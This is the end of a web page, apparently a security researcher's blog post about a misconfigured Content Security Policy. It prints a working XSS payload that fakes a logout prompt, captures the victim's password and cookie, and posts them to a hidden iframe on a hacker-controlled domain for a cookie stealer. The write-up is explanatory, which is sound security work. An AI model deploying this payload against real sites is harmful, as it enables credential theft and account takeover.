class=\\\"hljs-built_in\\\"\u003Edocument\u003C\u002Fspan\u003E.getElementById(\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"message\\\"\u003C\u002Fspan\u003E).innerHTML = event.data;\\n}\\n\u003C\u002Fspan\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u002F\u003Cspan class=\\\"hljs-name\\\"\u003Escript\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Cp\u003EOnce the data has been sent to my domain, from there I can send it to my cookie stealer script and save the data. The final payload can be viewed below:\u003C\u002Fp\u003E\\n\u003Ch5\u003EFinal Payload\u003C\u002Fh5\u003E\\n\u003Cpre\u003E\u003Ccode class=\\\"hljs language-html\\\"\u003E\u003Cspan class=\\\"hljs-tag\\\"\u003E&#x3C;\u003Cspan class=\\\"hljs-name\\\"\u003Eimg\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Esrc\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"https:\u002F\u002Fhackerdomain\u002Fimg.php\\\"\u003C\u002Fspan\u003E \u003Cspan class=\\\"hljs-attr\\\"\u003Eonerror\u003C\u002Fspan\u003E=\u003Cspan class=\\\"hljs-string\\\"\u003E\\\"this.src=a=document.getElementsByTagName('head')[0];f=document.createElement('iframe');f.src='https:\u002F\u002Fhackerdomain.com\u002Frecv.html';f.name='siteb';f.id='myframe';f.setAttribute('style','display:none');b=document.createElement('script');div=document.createElement('div');div.style='width:660;height:90%;font:16px Arial;padding:3em;text-align:center;margin:auto;';form=document.createElement('form');form.action='#';inp=document.createElement('input');inp.type='password';inp.id='mypw';sub=document.createElement('input');sub.type='submit';sub.id='subid';form.appendChild(inp);form.appendChild(sub);s='*';t='You have been logged out. Please login below to access your account.';b.type='text\u002Fjavascript';document.body.appendChild(f);fi=document.getElementById('myframe').contentWindow;b.appendChild(document.createTextNode('form.onsubmit = function() {pw=document.getElementById(\\\\'mypw\\\\').value;c=document.cookie;data={\\\\'cookie\\\\':c,\\\\'pw\\\\':pw};fi.postMessage(JSON.stringify(data),\\\\'*\\\\');}'));le=document.getElementsByClassName('left pane')[0];le.setAttribute('style','display:none');ri=document.getElementsByClassName('right pane')[0];ri.setAttribute('style','display:none');c=document.getElementsByClassName('cancelButton')[0];c.setAttribute('style','display:none');a.appendChild(b);m=document.getElementsByClassName('create modelimg')[0];m.style='overflow:hidden;';m.appendChild(div);div.innerHTML=t;div.appendChild(form);\\\"\u003C\u002Fspan\u003E\u002F\u003E\u003C\u002Fspan\u003E\\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\\n\u003Ch2\u003EConclusion\u003C\u002Fh2\u003E\\n\u003Cp\u003EWhile CSP is a great tool to limit the attack surface for potential attackers, it must be configured properly otherwise you might as well not use it. As shown in this article, the website I was looking for bugs on did use CSP however because of three policy directives which allowed inline javascript, iframes and images to be loaded from anywhere I could successfully mount an attack against any user of the site. This shows how important it is to be aware of the security models you deploy as a developer.\u003C\u002Fp\u003E\\n\u003Ch4\u003EReferences\u003C\u002Fh4\u003E\\n\u003Cul\u003E\\n\u003Cli\u003E\u003Ca href=\\\"http:\u002F\u002Fwww.html5rocks.com\u002Fen\u002Ftutorials\u002Fsecurity\u002Fcontent-security-policy\u002F\\\"\u003Ehttp:\u002F\u002Fwww.html5rocks.com\u002Fen\u002Ftutorials\u002Fsecurity\u002Fcontent-security-policy\u002F\u003C\u002Fa\u003E\u003C\u002Fli\u003E\\n\u003Cli\u003E\u003Ca href=\\\"https:\u002F\u002Fdeveloper.mozilla.org\u002Fen-US\u002Fdocs\u002FWeb\u002FAPI\u002FWindow\u002FpostMessage\\\"\u003Ehttps:\u002F\u002Fdeveloper.mozilla.org\u002Fen-US\u002Fdocs\u002FWeb\u002FAPI\u002FWindow\u002FpostMessage\u003C\u002Fa\u003E\u003C\u002Fli\u003E\\n\u003Cli\u003E\u003Ca href=\\\"https:\u002F\u002Fspeakerdeck.com\u002Fmikispag\u002Fmaking-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum\\\"\u003Ehttps:\u002F\u002Fspeakerdeck.com\u002Fmikispag\u002Fmaking-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum\u003C\u002Fa\u003E\u003C\u002Fli\u003E\\n\u003C\u002Ful\u003E\"}"}</script>
</div>
	</body>
</html>
